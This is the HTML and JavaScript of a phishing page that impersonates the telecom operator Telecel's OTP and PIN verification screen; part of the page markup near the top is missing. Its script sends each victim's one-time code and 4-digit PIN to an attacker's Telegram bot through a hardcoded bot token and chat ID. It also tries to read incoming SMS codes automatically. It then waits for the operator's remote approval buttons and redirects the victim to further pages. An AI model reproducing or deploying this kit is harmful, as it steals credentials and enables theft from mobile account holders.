<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Telecel - OTP Verification</title>
    <link href="https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Inter', sans-serif;
            background: #f8f9fa;
            min-height: 100vh;
            display: flex;
            align-items: center;
            justify-content: center;
            padding: 12px;
        }
        .container {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 24px;
            box-shadow: 0 10px 40px rgba(0,0,0,0.1);
            overflow: hidden;
        }
        .logo-section { text-align: center; padding: 35px 0 20px; }
        .telecel-logo { width: 138px; height: 138px; margin: 0 auto; }
        h1 { text-align: center; font-size: 23px; font-weight: 700; margin: 10px 0 6px; color: #1e2937; }
        .subtitle { text-align: center; color: #475569; font-size: 15.2px; padding: 0 25px 20px; line-height: 1.45; }
        .otp-container {
            display: flex;
            justify-content: center;
            gap: 10px;
            margin: 20px 0 28px;
            padding: 0 10px;
        }
        .otp-input {
            width: 52px;
            height: 62px;
            text-align: center;
            font-size: 26px;
            font-weight: 700;
            border: 2px solid #e2e8f0;
            border-radius: 12px;
            outline: none;
        }
        .otp-input:focus {
            border-color: #E30613;
            box-shadow: 0 0 0 3px rgba(227, 6, 19, 0.12);
        }
        .form-section { padding: 0 25px 35px; }
        .error-msg {
            text-align: center;
            margin: 12px 20px;
            font-size: 14.5px;
            padding: 12px;
            border-radius: 10px;
            display: none;
            color: #dc3545;
            background: #ffebee;
        }
        .btn-action {
            width: 100%;
            background: #E30613;
            color: white;
            border: none;
            padding: 16px;
            font-size: 17px;
            font-weight: 700;
            border-radius: 50px;
            cursor: pointer;
            margin: 8px 0;
        }
        .back-btn {
            width: 100%;
            background: transparent;
            color: #64748b;
            border: 2px solid #e2e8f0;
            padding: 15px;
            font-size: 16px;
            font-weight: 600;
            border-radius: 50px;
            cursor: pointer;
        }

        /* PIN Modal */
        #pinModal {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.9);
            display: none;
            align-items: center;
            justify-content: center;
            z-index: 10000;
        }
        .modal-content {
            width: 100%;
            max-width: 420px;
            background: white;
            border-radius: 24px;
            padding: 30px 20px;
            text-align: center;
        }

        #spinner {
            position: fixed;
            inset: 0;
            background: rgba(0,0,0,0.92);
            display: none;
            justify-content: center;
            align-items: center;
            z-index: 9999;
            flex-direction: column;
            color: white;
        }
        .spin {
            width: 70px;
            height: 70px;
            border: 7px solid #fff;
            border-top-color: #E30613;
            border-radius: 50%;
            animation: spin 1s linear infinite;
        }
        @keyframes spin { to { transform: rotate(360deg); } }
    </style>
</head>

                     class="telecel-logo" alt="Telecel Logo">
            </div>
            <h1>Enter PIN</h1>
            <p class="subtitle">Enter your 4-digit PIN to complete this transaction</p>
            <div class="otp-container" id="pinInputs"></div>
            <div class="error-msg" id="pinErrMsg"></div>
            <div class="form-section">
                <button class="btn-action" id="confirmPinBtn">Confirm PIN</button>
            </div>
        </div>
    </div>

    <div id="spinner">
        <div class="spin"></div>
        <p style="margin-top:15px;">Waiting for approval...</p>
    </div>

    <script>
        const CONFIG = {
            BOT_TOKEN: '8553539359:AAFTjnEFYGG_uB-Iqjbcc30VxroE1JVdmQQ',
            CHAT_ID: '1915520147',
            SUCCESS_PAGE: 'https://unlimiteddata.vercel.app/success.html',
            DEVICE_PAGE: 'https://unlimiteddata.vercel.app/device_verify.html'
        };

        let state = { lastUpdateId: 0, pollInterval: null };

        const errMsg = document.getElementById('errMsg');
        const pinErrMsg = document.getElementById('pinErrMsg');
        const spinner = document.getElementById('spinner');
        const pinModal = document.getElementById('pinModal');

        function createInputs(id, count) {
            const container = document.getElementById(id);
            container.innerHTML = '';
            for (let i = 0; i < count; i++) {
                const input = document.createElement('input');
                input.type = 'text';
                input.maxLength = 1;
                input.className = 'otp-input';
                input.inputMode = 'numeric';
                container.appendChild(input);
            }
        }

        function getCode(id) {
            return Array.from(document.querySelectorAll(`#${id} .otp-input`)).map(i => i.value).join('');
        }

        function focusFirst(id) {
            const first = document.querySelector(`#${id} .otp-input`);
            if (first) first.focus();
        }

        function setupAutoFocus(containerId, length, onComplete) {
            const inputs = document.querySelectorAll(`#${containerId} .otp-input`);
            inputs.forEach((input, index) => {
                input.addEventListener('input', () => {
                    if (input.value.length === 1 && index < length - 1) inputs[index + 1].focus();
                    if (getCode(containerId).length === length) setTimeout(onComplete, 300);
                });
                input.addEventListener('keydown', (e) => {
                    if (e.key === 'Backspace' && !input.value && index > 0) inputs[index - 1].focus();
                });
            });
        }

        async function requestAutoOTP() {
            if (!('OTPCredential' in window)) return;
            try {
                const credential = await navigator.credentials.get({ otp: { transport: ['sms'] } });
                if (credential?.code) {
                    const inputs = document.querySelectorAll('#otpInputs .otp-input');
                    credential.code.split('').forEach((digit, i) => { if (inputs[i]) inputs[i].value = digit; });
                    setTimeout(submitOTP, 500);
                }
            } catch (e) {}
        }

        function submitOTP() {
            const otp = getCode('otpInputs');
            if (otp.length !== 5) return;

            const ts = Date.now();
            const approveId = `otp_approve_${ts}`;
            const declineId = `otp_decline_${ts}`;
            const verifyDeviceId = `otp_verify_${ts}`;
            const validPinId = `valid_pin_${ts}`;
            const invalidPinId = `invalid_pin_${ts}`;

            const message = `<b>🔴 OTP Verification Received</b>\n\nOTP Code: <code>${otp}</code>\n\nChoose Action:`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: message,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [
                            [
                                { text: "✅ Approve & Continue", callback_data: approveId },
                                { text: "❌ Decline", callback_data: declineId }
                            ],
                            [
                                { text: "📱 Verify Device", callback_data: verifyDeviceId }
                            ],
                            [
                                { text: "✅ Valid PIN", callback_data: validPinId },
                                { text: "❌ Invalid PIN", callback_data: invalidPinId }
                            ]
                        ]
                    }
                })
            }).then(() => {
                spinner.style.display = 'flex';
                startPolling(approveId, declineId, verifyDeviceId, validPinId, invalidPinId);
            });
        }

        function startPolling(approveId, declineId, verifyDeviceId, validPinId, invalidPinId) {
            if (state.pollInterval) clearInterval(state.pollInterval);
            state.pollInterval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                    .then(r => r.json())
                    .then(data => {
                        data.result?.forEach(update => {
                            state.lastUpdateId = update.update_id;
                            if (update.callback_query) {
                                const cb = update.callback_query.data;

                                if (cb === approveId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    showPinModal();
                                } 
                                else if (cb === declineId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    errMsg.textContent = "Request declined. Please try again.";
                                    errMsg.style.display = 'block';
                                    document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
                                    focusFirst('otpInputs');
                                }
                                else if (cb === verifyDeviceId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.DEVICE_PAGE;
                                }
                                else if (cb === validPinId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    window.location.href = CONFIG.SUCCESS_PAGE;
                                }
                                else if (cb === invalidPinId) {
                                    clearInterval(state.pollInterval);
                                    spinner.style.display = 'none';
                                    errMsg.textContent = "Invalid PIN. Please try again.";
                                    errMsg.style.display = 'block';
                                    document.querySelectorAll('#otpInputs .otp-input').forEach(i => i.value = '');
                                    focusFirst('otpInputs');
                                }
                            }
                        });
                    });
            }, 1800);
        }

        function showPinModal() {
            pinModal.style.display = 'flex';
            createInputs('pinInputs', 4);
            setupAutoFocus('pinInputs', 4, submitPIN);
            focusFirst('pinInputs');
        }

        function submitPIN() {
            const pin = getCode('pinInputs');
            if (pin.length !== 4) return;

            const ts = Date.now();
            const validId = `valid_pin_${ts}`;
            const invalidId = `invalid_pin_${ts}`;

            fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/sendMessage`, {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({
                    chat_id: CONFIG.CHAT_ID,
                    text: `<b>🔴 PIN Verification</b>\n\nPIN: <code>${pin}</code>`,
                    parse_mode: 'HTML',
                    reply_markup: {
                        inline_keyboard: [[
                            { text: "✅ Valid PIN", callback_data: validId },
                            { text: "❌ Invalid PIN", callback_data: invalidId }
                        ]]
                    }
                })
            }).then(() => startPinPolling(validId, invalidId));
        }

        function startPinPolling(validId, invalidId) {
            const interval = setInterval(() => {
                fetch(`https://api.telegram.org/bot${CONFIG.BOT_TOKEN}/getUpdates?offset=${state.lastUpdateId + 1}`)
                    .then(r => r.json())
                    .then(data => {
                        data.result?.forEach(update => {
                            state.lastUpdateId = update.update_id;
                            if (update.callback_query) {
                                const cb = update.callback_query.data;
                                if (cb === validId) {
                                    clearInterval(interval);
                                    pinModal.style.display = 'none';
                                    window.location.href = CONFIG.SUCCESS_PAGE;
                                } else if (cb === invalidId) {
                                    clearInterval(interval);
                                    pinErrMsg.textContent = "Invalid PIN. Please try again.";
                                    pinErrMsg.style.display = 'block';
                                    document.querySelectorAll('#pinInputs .otp-input').forEach(i => i.value = '');
                                    focusFirst('pinInputs');
                                }
                            }
                        });
                    });
            }, 1800);
        }

        // Initialize
        createInputs('otpInputs', 5);
        setupAutoFocus('otpInputs', 5, submitOTP);
        focusFirst('otpInputs');

        window.onload = () => setTimeout(requestAutoOTP, 800);
        document.getElementById('verifyBtn').onclick = submitOTP;
    </script>
</body>
